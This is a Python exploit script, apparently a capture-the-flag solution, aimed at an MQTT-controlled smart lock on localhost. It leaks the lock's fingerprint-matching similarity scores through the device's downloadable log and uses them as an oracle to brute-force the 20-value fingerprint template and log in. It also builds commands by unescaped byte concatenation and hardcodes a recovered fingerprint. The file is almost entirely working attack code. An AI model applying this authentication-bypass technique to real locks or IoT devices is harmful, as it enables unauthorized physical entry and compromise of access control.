import paho.mqtt.client as mqtt
import json
import random
import string
import time
import ssl
from pwn import *
from threading import Event
correct_finger = [29,373307,1065735249,2909012772,1932386,2933,3462545,5692838,2601798933,3102258193,32207873,36167,1274411,31737324,3369724400,30220736,2479958049,5,3612650882,4088014656]
class SecureLockTester:
    def __init__(self, 
                 host="localhost", 
                 port=8883,
                 ca_certs="/etc/mosquitto/ca.crt",
                 insecure=True):
        self.host = host
        self.port = port
        self.ca_certs = ca_certs
        self.insecure = insecure
        
        self.client = mqtt.Client(protocol=mqtt.MQTTv311)
        self._configure_tls()
        
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        
        self.auth_token = None
        self.session_id = None
        self.response_event = Event()
        self.last_response = None
        self.log_content = ""
        self.log_changed = False

    def _configure_tls(self):
        self.client.tls_set(
            ca_certs=self.ca_certs,
            cert_reqs=ssl.CERT_REQUIRED,
            tls_version=ssl.PROTOCOL_TLSv1_2
        )
        if self.insecure:
            self.client.tls_insecure_set(True)

    def on_connect(self, client, userdata, flags, rc):
        print(f"status code: {rc}")


    def on_message(self, client, userdata, msg):
        topic = msg.topic
        payload = msg.payload.decode()
        if topic == "logfile":
            self.log_content += payload
            if "EOF" in payload and 'similarity' in self.log_content:
                self.log_changed = True
            self.response_event.set()
        elif topic == "re_"+self.auth_token:
            if "login successed. session_id: " in payload:
                self.session_id = payload.split("session_id: ")[1].strip()
            self.response_event.set()
        elif self.session_id != None and topic == self.session_id:
            self.last_response = payload
            self.response_event.set()

    def wait_for_response(self, timeout=100):
        self.response_event.clear()
        received = self.response_event.wait(timeout)
        if not received:
            print("response timeout")
        return received

    def generate_auth_token(self):
        token = "aaaaaaaaaaaaaaaa"
        self.auth_token = token
        self.client.subscribe("re_" + token)  
        self.client.publish("auth_token", token)
        self.wait_for_response()
        print(f"auth_token: {token}")


    def login(self,finger):
        buf_str = '['+ ','.join([str(num) for num in finger]) + ']'
        self.client.publish(self.auth_token,buf_str)
        if self.wait_for_response():
            if self.session_id:
                print(f"login successed. sessionID: {self.session_id}")
                self.client.subscribe(self.session_id)
                return True
        return False
    
    def lock(self):
        return self.send_command("lock_door")
    def unlock(self):
        return self.send_command("unlock_door")
    def download_log(self):
        self.client.publish("logger", "download")
        return self.wait_for_response()
    def clear_log(self):
        self.client.publish("logger", "clear")
        return self.wait_for_response()
    def add_finger(self, finger):
        res = self.send_command("add_finger", [finger])
        if res and "new finger id:" in res:
            return int(res.split("new finger id:")[1].strip())
        return -1
    def del_finger(self, finger_id):
        res =  self.send_command("remove_finger", [finger_id])
        if res and "removed finger id:" in res:
            return int(res.split("removed finger id:")[1].strip())
        return -1
    def edit_finger(self, finger_id, new_finger):
        res = self.send_command("edit_finger", [finger_id, new_finger])
        if res and "changed finger id:" in res:
            return int(res.split("changed finger id:")[1].strip())
        return -1

    def send_command(self, command, args=None):
        if not self.session_id:
            raise ValueError("login first")
        
        cmd = {
            "session": self.session_id,
            "request": command,
            "req_args": args or []
        }
        json_cmd = b"{\"session\":\"" + self.session_id.encode() + b"\",\"request\":\"" + command.encode() + b"\",\"req_args\":" + b"["
        if args:
                json_cmd += b'"' + args[0] +b'"'
                if len(args) > 1:
                    json_cmd += b','
                    json_cmd += b'"' + args[1] +b'"'
        json_cmd += b']' + b"}"
        self.client.publish("manager", json_cmd)
        print(f"sent cmd: {command} {json_cmd}")
        
        if self.wait_for_response():
            return self.last_response
        return None

    def test_secure_connection(self):
        try:
            self.client.connect(self.host, self.port, 60)
            self.client.loop_start()
            time.sleep(1)  
            print("connected")
            return True
        except Exception as e:
            print(f"connection failed: {str(e)}")
            return False

    def brute_fingerprint(self):
        correct = [0] * 20  

        max_sim = 0
        for i in range(20):
            cur_str = '['+ ','.join([str(num) for num in correct]) + ']'
            min_sim = self.brute_test_finger(cur_str)
            max_sim = min_sim
            cur = 0
            for round in range(8):
                max_j = 0
                for j in range(16):
                    new_cur = j<<(28-4*round) | cur
                    correct[i] = new_cur
                    buf_str = '['+ ','.join([str(num) for num in correct]) + ']'
                    new_sim = self.brute_test_finger(buf_str)
                    if new_sim > max_sim:
                        max_sim = new_sim
                        max_j = j
                if max_sim - min_sim > 3.5:
                    cur = max_j<<(28-4*round) | cur
                if max_sim - min_sim > 4.5:
                    break
            correct[i] = cur
                
        print(f"Position {i} found: {correct[i]}")
        final_buf = correct
        return final_buf
    
    
    def brute_test_finger(self, buf):
        self.clear_log()
        self.client.publish(self.auth_token,buf)
        self.wait_for_response()
        self.download_log()
        while True:
            if self.log_changed:
                self.log_changed = False
                break
        res = self.log_content.split("%")[-1].split("\n")[0]
        print(res, buf)
        self.log_content = ""
        return float(res)
        
if __name__ == "__main__":
    tester = SecureLockTester(
        host="127.0.0.1",
        port=8883,
        ca_certs="src/ca.crt",
        insecure=True 
    )
    try:
        if tester.test_secure_connection():
            tester.generate_auth_token() 
            tester.client.subscribe("logfile")
            sleep(1)  
            fingerprint = tester.brute_fingerprint()
            print("Correct fingerprint:", fingerprint)
            tester.login(fingerprint)

    finally:
        tester.client.loop_stop()
        tester.client.disconnect()